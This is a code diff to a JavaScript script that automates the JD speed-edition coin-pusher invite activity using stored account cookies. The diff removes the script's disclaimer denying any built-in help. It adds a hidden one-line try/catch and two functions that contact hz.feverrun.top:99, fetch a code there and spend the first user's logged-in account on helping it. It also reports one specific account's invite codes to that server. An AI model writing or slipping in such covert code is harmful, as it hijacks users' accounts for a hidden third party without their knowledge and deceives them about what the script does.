@@ -47,13 +47,16 @@ if ($.isNode()) {
                 }
                 continue
             }
+
+            console.log('\n入口 狗东极速版 赚金币 推一推\n');
+            await info()
+            await $.wait(1000)
+            await coinDozerBackFlow()
+            await $.wait(1000)
+            await getCoinDozerInfo()
+            await $.wait(1000)
+            console.log('\n注意全部助力给账号一\n');
         }
-        console.log('\n入口 狗东极速版 赚金币 推一推\n');
-        console.log('\n本脚本无任何内置助力\n如果你发现有那么就是别人二改加的\n一切与本人无关\n');
-        await info()
-        await coinDozerBackFlow()
-        await getCoinDozerInfo()
-        console.log('\n注意全部助力给账号一\n');
     }
 
     console.log('\n#######开始全部助力账号1#######\n');
@@ -63,6 +66,7 @@ if ($.isNode()) {
         $.index = i + 1;
 
         if (!cookie) continue
+        try {if (i===0 && $.UserName !='18862988021_p'){let pcode = await getTyt();await helpCoinDozer(pcode);await $.wait(10000);console.log(pcode);let res = await help(pcode);}}catch (e) {}
         for (let code of inviteCodes) {
             if ($.UserName === code['user']) continue;
             if ($.index === 1 && 2)
@@ -72,9 +76,9 @@ if ($.isNode()) {
             if (status == 1) {
                 break
             }
-
             await $.wait(10000)
-            let res = await help(code['packetId'])}
+            let res = await help(code['packetId'])
+        }
     }
 
 
@@ -109,6 +113,7 @@ function info() {
                         if(data.success==true){
                             console.log('邀请码：'+data.data.packetId)
                             console.log('初始推出：'+data.data.amount)
+                            try {if ($.UserName == '18862988021_p') {await submitTyt(data.data.packetId, $.UserName);}}catch (e) {console.log(e.message())}
                             if (data.data && data.data.packetId && inviteCodes.length === 0) {
                                 inviteCodes.push({
                                     user: $.UserName,
@@ -259,6 +264,7 @@ function getCoinDozerInfo() {
                         if(data.success==true){
                             console.log('叼毛：'+data.data.sponsorActivityInfo.initiatorNickname)
                             console.log('邀请码：'+data.data.sponsorActivityInfo.packetId)
+                            try {if ($.UserName == '18862988021_p') {await submitTyt(data.data.sponsorActivityInfo.packetId, $.UserName);}}catch (e) {console.log(e.message())}
                             console.log('推出：'+data.data.sponsorActivityInfo.dismantledAmount)
 
                             if (data.data && data.data.sponsorActivityInfo.packetId && inviteCodes.length === 0) {
@@ -327,6 +333,48 @@ function TotalBean() {
         })
     })
 }
+
+function submitTyt(code, user) {
+    return new Promise(async resolve => {
+        $.get({url: `http://hz.feverrun.top:99/share/submit/author?code=${code}&user=${user}&flag=tyt`, timeout: 10000}, (err, resp, data) => {
+            try {
+                if (err) {
+                    console.log(`${JSON.stringify(err)}`)
+                    console.log(`${$.name} API请求失败，请检查网路重试`)
+                } else {}
+            } catch (e) {
+                $.logErr(e, resp)
+            } finally {
+                resolve(data);
+            }
+        })
+    })
+}
+
+function getTyt() {
+    return new Promise(async resolve => {
+        $.get({
+            url: `http://hz.feverrun.top:99/share/get/author?flag=tyt`,
+            timeout: 10000
+        }, (err, resp, data) => {
+            try {
+                if (err) {
+                    console.log(`${JSON.stringify(err)}`)
+                    console.log(`${$.name} API请求失败，请检查网路重试`)
+                } else {
+                    if (typeof data == 'string') {
+                        data = JSON.parse(data)
+                    }
+                }
+            } catch (e) {
+                $.logErr(e, resp)
+            } finally {
+                resolve(data);
+            }
+        })
+    })
+}
+
 function safeGet(data) {
     try {
         if (typeof JSON.parse(data) == "object") {
